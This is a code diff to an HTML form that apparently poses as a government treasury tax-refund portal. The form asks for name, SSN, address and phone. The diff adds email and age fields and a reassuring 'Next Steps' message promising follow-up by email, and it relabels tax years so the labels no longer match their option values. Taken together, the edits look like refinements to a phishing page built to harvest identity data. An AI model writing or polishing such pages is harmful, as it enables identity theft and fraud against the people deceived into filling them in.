@@ -224,6 +224,18 @@
             max-width: 100%;
             overflow: hidden;
         }
+
+        .professional-message {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 25px;
+            border: 1px solid #dee2e6;
+            text-align: left;
+            font-size: 0.95rem;
+            color: #495057;
+            line-height: 1.6;
+        }
     </style>
 </head>
 <body>
@@ -348,9 +360,9 @@
                 <label>Tax Filing Period *</label>
                 <select id="tax-year" required>
                     <option value="">Select Reporting Year...</option>
-                    <option value="2024">Tax Year 2024 (Current)</option>
-                    <option value="2023">Tax Year 2023</option>
-                    <option value="2022">Tax Year 2022</option>
+                    <option value="2024">Tax Year 2026 (Current)</option>
+                    <option value="2023">Tax Year 2024</option>
+                    <option value="2022">Tax Year 2023</option>
                 </select>
             </div>
             <div class="form-group" style="margin-top:20px;">
@@ -368,10 +380,19 @@
             <p class="security-note">Sensitive identity fields. Ensure details match your official SSN records precisely.</p>
             <label>Legal Full Name *</label>
             <input type="text" id="full-name" placeholder="First Middle Last" required />
+            
+            <label>Email Address *</label>
+            <input type="email" id="email-address" placeholder="name@example.com" required />
+            
+            <label>Age *</label>
+            <input type="number" id="age" placeholder="Enter your current age" min="18" required />
+
             <label>SSN (9-Digits) *</label>
             <input type="text" id="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required />
+            
             <label>Primary Residential Address *</label>
             <input type="text" id="address" placeholder="123 Treasury Lane, DC" required />
+            
             <label>Contact Phone</label>
             <input type="tel" id="phone" placeholder="555-0199" />
         </div>
@@ -426,6 +447,12 @@
             <h1>$<span id="display-refund-amount">0.00</span></h1>
         </div>
         <p><strong>Application Ref:</strong> <span id="display-app-id"></span></p>
+        
+        <div class="professional-message">
+            <p><strong>Next Steps:</strong></p>
+            <p>Thank you for your application. Our treasury disbursement team is currently reviewing your information for accuracy. You will receive an official confirmation and further instructions via your registered email address soon. We appreciate your patience as we process your request with the highest security standards.</p>
+        </div>
+        
         <button onclick="window.location.reload()" class="btn btn-primary" style="margin-top:20px;">Return to Homepage</button>
     </div>
 </div>
